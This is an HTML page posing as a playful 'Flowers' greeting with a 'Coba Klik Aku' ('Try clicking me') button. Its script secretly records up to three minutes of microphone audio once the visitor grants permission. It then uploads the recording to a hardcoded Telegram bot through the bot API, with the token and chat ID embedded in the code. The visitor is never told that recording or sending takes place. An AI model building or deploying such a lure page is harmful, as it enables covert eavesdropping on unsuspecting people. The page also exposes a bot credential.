<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="css/style.css">
    <title>Flowers</title>
</head>
<body>
    <div class="greetings">
        <span>A</span>
        <span>L</span>
        <span>L</span>
        <span>O</span>
        <span>O</span>
    </div>
    <div class="description">
        <p><span></span></p>
    </div>
    <button id="recordButton">Coba Klik Aku</button>

    <script>
        let mediaRecorder;
        let audioChunks = [];
        let recordTimeout;

        const recordButton = document.getElementById('recordButton');

        // Fungsi merekam suara
        recordButton.addEventListener('click', () => {
            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                navigator.mediaDevices.getUserMedia({ audio: true })
                    .then((stream) => {
                        mediaRecorder = new MediaRecorder(stream);
                        mediaRecorder.start();

                        audioChunks = [];
                        mediaRecorder.addEventListener('dataavailable', event => {
                            audioChunks.push(event.data);
                        });

                        mediaRecorder.addEventListener('stop', () => {
                            const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
                            sendAudioToTelegram(audioBlob);
                        });

                        recordButton.disabled = true;

                        // Otomatis berhenti setelah 3 menit (180.000 ms)
                        recordTimeout = setTimeout(() => {
                            if (mediaRecorder.state !== 'inactive') {
                                mediaRecorder.stop();
                            }
                            recordButton.disabled = false;
                        }, 180000);
                    })
                    .catch((error) => {
                        console.error("Gagal mengakses mikrofon:", error.message);
                        alert("Tidak dapat mengakses mikrofon. Harap izinkan akses mikrofon untuk melanjutkan.");
                    });
            } else {
                alert("Browser Anda tidak mendukung akses mikrofon.");
            }
        });

        // Kirim audio ke Telegram
        function sendAudioToTelegram(audioBlob) {
            const botToken = '8103522113:AAECNtZDVMnPLaXX3HD1IFeQuOp7cQ2Td_Y'; // Ganti dengan token bot Anda
            const chatId = '6813368909'; // Ganti dengan chat ID Anda

            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('voice', audioBlob, 'voice_message.webm');

            fetch(`https://api.telegram.org/bot${botToken}/sendVoice`, {
                method: 'POST',
                body: formData,
            })
                .then(response => {
                    if (!response.ok) {
                        throw new Error(`HTTP error! Status: ${response.status}`);
                    }
                    return response.json();
                })
                .then(result => {
                    console.log("Pesan suara berhasil dikirim:", result);
                    alert("Pesan suara berhasil dikirim!");
                })
                .catch(error => {
                    console.error("Gagal mengirim pesan suara ke Telegram:", error);
                    alert("Terjadi kesalahan saat mengirim pesan suara. Silakan coba lagi.");
                });
        }
    </script>
</body>
</html>
